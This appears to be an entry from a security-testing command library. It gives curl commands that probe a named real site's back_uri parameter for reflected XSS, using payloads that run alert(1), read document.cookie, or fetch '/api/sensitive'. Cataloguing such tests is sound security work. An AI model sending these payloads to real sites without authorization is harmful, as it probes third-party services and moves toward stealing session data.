---
data: 'curl "https://larksuite.com/?back_uri=%22%3E%3Cscript%3Ealert(1)%3C/script%3E"'
tags:
  - web
  - xss
  - testing
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:24:31.422Z'
id: 747a8280-d2fe-45e8-8382-b09936f39093
verified: false
validated: true
submitted: true
---
# curl-reflected-xss-test

## Command

```bash
curl "https://larksuite.com/?back_uri=%22%3E%3Cscript%3Ealert(1)%3C/script%3E"
```

## Description

This command tests for reflected XSS by injecting a URL-encoded JavaScript payload into the back_uri parameter and checking if it appears unescaped in the HTML response.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `back_uri` | URL-encoded payload (e.g., %22%3E%3Cscript%3Ealert(1)%3C/script%3E for "><script>alert(1)</script>) | Yes |

## Examples

### Basic Usage

```bash
curl "https://larksuite.com/?back_uri=%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E"
```

### Advanced Usage

```bash
curl -s "https://larksuite.com/?back_uri=%22%3E%3Cscript%3Efetch('/api/sensitive')%3C/script%3E" | grep -i script
```

> Pipe to grep to check for reflected script tags.

## Expected Output

HTML response containing the unescaped payload, e.g., ...back_uri="><script>alert(1)</script>... indicating vulnerability.

## Related

- [[Related Procedure: Exploit Reflected XSS via back_uri]]
